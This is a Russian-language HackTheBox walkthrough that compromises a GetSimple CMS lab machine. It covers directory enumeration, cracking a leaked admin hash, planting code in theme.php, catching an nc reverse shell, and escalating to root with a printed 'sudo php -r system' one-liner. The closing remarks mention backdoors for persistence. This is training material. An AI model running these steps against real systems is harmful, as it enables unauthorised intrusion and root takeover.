# 🖥️ Отчет по машине: knowledge chek
**Платформа:** HackTheBox


## 1. Разведка 
``` nmap -sCV 10.10.10.10```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
so starta est robots.txt i /admin/

в админе форма входа 
<img width="316" height="301" alt="Снимок экрана — 2026-10-24 в 10 31 19" src="https://github.com/user-attachments/assets/33c2f5ae-ee56-4477-9bb9-e7e8543f5156" />

При проверке формы входа не обнаружил очевидного пути для эксплуатации. На текущем этапе не стал углубляться в анализ авторизации и переключился на перечисление директорий. Проверка не была исчерпывающей


```
dirsearch

```
```
[03:32:37] 301 -  314B  - /admin  ->  http://10.129.42.249/admin/
[03:32:38] 200 -    1KB - /admin/
[03:32:38] 302 -    0B  - /admin/download.php  ->  index.php?redirect=download.php?
[03:32:38] 200 -    1KB - /admin/index.php
[03:32:38] 302 -    0B  - /admin/upload.php  ->  index.php?redirect=upload.php?
[03:32:50] 301 -  316B  - /backups  ->  http://10.129.42.249/backups/
[03:32:50] 200 -  477B  - /backups/
[03:32:57] 301 -  313B  - /data  ->  http://10.129.42.249/data/
[03:32:57] 200 -  513B  - /data/
[03:32:58] 200 -  513B  - /data/cache/
[03:33:16] 200 -   12KB - /LICENSE.txt
[03:33:28] 301 -  316B  - /plugins  ->  http://10.129.42.249/plugins/
[03:33:28] 200 -  535B  - /plugins/
[03:33:31] 200 -  889B  - /readme.txt
[03:33:32] 200 -   32B  - /robots.txt
[03:33:34] 403 -  278B  - /server-status
[03:33:34] 403 -  278B  - /server-status/
[03:33:36] 200 -  257B  - /sitemap.xml
[03:33:42] 301 -  314B  - /theme  ->  http://10.129.42.249/theme/
```
gobuster s slovarem big po skromnee 
```
gobuster dir -u http://10.129.42.249 -w /usr/share/wordlists/dirb/big.txt
```

```
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]
plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
robots.txt           (Status: 200) [Size: 32]
server-status        (Status: 403) [Size: 278]
sitemap.xml          (Status: 200) [Size: 431]
theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]
Progress: 20469 / 20469 (100.00%)
```

Есть код 200 к папкам backups  и Data, первая полностью пустая а во второй есть дерево папок, самой интересной кажется users а в ней лежит admin 

<img width="493" height="401" alt="Снимок экрана — 2026-10-24 в 11 23 52" src="https://github.com/user-attachments/assets/ae295618-241d-43b7-bc6e-473b2040b7ad" />

<img width="525" height="258" alt="Снимок экрана — 2026-10-24 в 11 24 05" src="https://github.com/user-attachments/assets/c6acbc7b-6044-45c5-9a1b-fcbc14ce3e11" />

строка pwd это пароль но он захэширован, заносим его в crackstation и вот есть пароль за SHA1 

<img width="961" height="421" alt="Снимок экрана — 2026-10-24 в 11 24 40" src="https://github.com/user-attachments/assets/7c3e6c63-060e-409e-8d5a-82456e8d57da" />

на самом деле креды стандартные, можно было и в ручную перебирать и смотреть, но суть тут не в этом (хотя знание дефолта часто упрощает жизнь)

итак исп гугл)

<img width="1045" height="90" alt="Снимок экрана — 2026-10-24 в 11 45 10" src="https://github.com/user-attachments/assets/840140ac-c534-46f0-a271-88d747f31653" />

результатов, тьма. ознакомившись это старая версия getsimple 3.3.15 тут если изучить понимаем что есть возможность редачить файл theme.php и он работает с коробки 

<img width="896" height="375" alt="Снимок экрана — 2026-10-24 в 12 25 01" src="https://github.com/user-attachments/assets/2725b010-a40b-406f-a208-0d03aab400d0" />

закидываем наш код

<img width="1011" height="419" alt="Снимок экрана — 2026-10-24 в 12 26 31" src="https://github.com/user-attachments/assets/0c79b910-0525-43c3-889a-347d8bca9bef" />

запускаем слушатель и обращаемся к нему curl

```
──(w3awer㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.166] from (UNKNOWN) [10.129.248.52] 45952
bash: cannot set terminal process group (1028): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
whoami
www-data
```
внутри как www, сразу смотрим какие есть возможности
```
www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```
Отлично, есть потенциальная точка входа, однако пока ее опущу (я понимаю что делать лучше не так, но все мы люди)
```
www-data@gettingstarted:/var/www/html/theme/Innovation$ cd /..
cd /..
www-data@gettingstarted:/$ ls
www-data@gettingstarted:/$ cd home
cd home
www-data@gettingstarted:/home$ ls
ls
mrb3n
www-data@gettingstarted:/home$ cd mrb3n
cd mrb3n
www-data@gettingstarted:/home/mrb3n$ ls
ls
user.txt
www-data@gettingstarted:/home/mrb3n$ cat user.txt
cat user.txt
7002**************eed21d8
```
есть флаг, значит стоит вернуться к привилегиям. 
```
www-data@gettingstarted:/$ sudo /usr/bin/php -r "system('/bin/sh');"
sudo /usr/bin/php -r "system('/bin/sh');"
whoami
root
cd root
ls
root.txt
snap
cat root.txt
f1fba6**************da6387842

```
и этот флаг тоже есть всьо 
--------------------------------------------------------------------------------
послесловие 
    я посчитал нужным не распыляться на машине, по сути это зачет по пройденным темам, если что не знаешь погугли сервис/эксплоит/команду. машина кайф все что дали в этом модуле и использовалось, нативно подразумеваешь каким путем стоит идти, в как директорию заглянуть, в общем машина хороша. 
    конечно стоило бы подумать как закрепиться, сделать бэкдор, но пока наверное и не нужно блистать (особенно если не умеешь хе хе)


всем мир!


